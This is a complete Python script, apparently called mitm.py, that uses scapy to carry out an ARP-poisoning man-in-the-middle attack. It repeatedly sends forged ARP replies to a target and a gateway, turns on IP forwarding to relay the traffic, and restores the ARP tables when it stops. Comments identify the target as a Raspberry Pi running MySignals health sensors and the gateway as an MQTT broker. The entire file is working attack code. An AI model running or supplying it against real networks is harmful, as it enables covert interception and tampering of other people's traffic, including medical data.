import scapy.all as scapy
import os
import sys

# -----------------------------------------------------------------------------
# Restore ARP tables
# -----------------------------------------------------------------------------
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print ('[*] Restoring targets...')
    scapy.send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip,
        hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    scapy.send(scapy.ARP(op=2, psrc=target_ip, pdst=gateway_ip,
        hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)
    return

# -----------------------------------------------------------------------------
# Get MAC of ip address
# -----------------------------------------------------------------------------
def get_mac(ip_address):
    response, unanswered = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        /scapy.ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in response:
        return r[scapy.Ether].src
    return None

# -----------------------------------------------------------------------------
# Poison ARP tables
# -----------------------------------------------------------------------------
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = scapy.ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = scapy.ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print ('[*] Beginning the ARP poison. [CTRL-C to stop]')
    while 1:
        try:
            scapy.send(poison_target)
            scapy.send(poison_gateway)
            scapy.time.sleep(2)

        except KeyboardInterrupt:
            break

    print ('\n[*] ARP poison attack finished.')
    return

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
def main():

    if(len(sys.argv) != 4):
        print('error, sample invocation is: $python3 mitm.py <interface> <target_address> <gateway_address>')

    INTERFACE = sys.argv[1]   # Network Interface to use
    TARGET_IP = sys.argv[2]   # Raspberry Pi w/ MySignals
    GATEWAY_IP = sys.argv[3]  # MQTT Mosquito Broker

    # Set up network interface
    scapy.conf.iface = INTERFACE
    scapy.conf.verb = 0
    print ("[*] Setting up %s" % INTERFACE)

    # Get MAC address of gateway and target
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    if GATEWAY_MAC is None:
        print ("[-] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print ("[*] Gateway %s is at %s" %(GATEWAY_IP, GATEWAY_MAC))

    TARGET_MAC = get_mac(TARGET_IP)
    if TARGET_MAC is None:
        print ("[-] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        print ("[*] Target %s is at %s" % (TARGET_IP, TARGET_MAC))

    # Get ipv4 forwarding status
    ip_forward = os.popen('cat /proc/sys/net/ipv4/ip_forward').read()

    # Turn on forwarding if disabled "for ubuntu based distros"
    if  int(ip_forward) == 0:
        print("[*] Enabling ipv4 forwarding")
        os.popen('sysctl net.ipv4.ip_forward=1')

    # Start ARP Poisoning
    poison_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)

    # Restore ARP table and restore ipv4 forward status
    restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
    if int(ip_forward) == 0:
        print("[*] Disabling ipv4 forwarding")
        os.popen('sysctl net.ipv4.ip_forward=0')

    sys.exit(0)

# -----------------------------------------------------------------------------
#
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    main()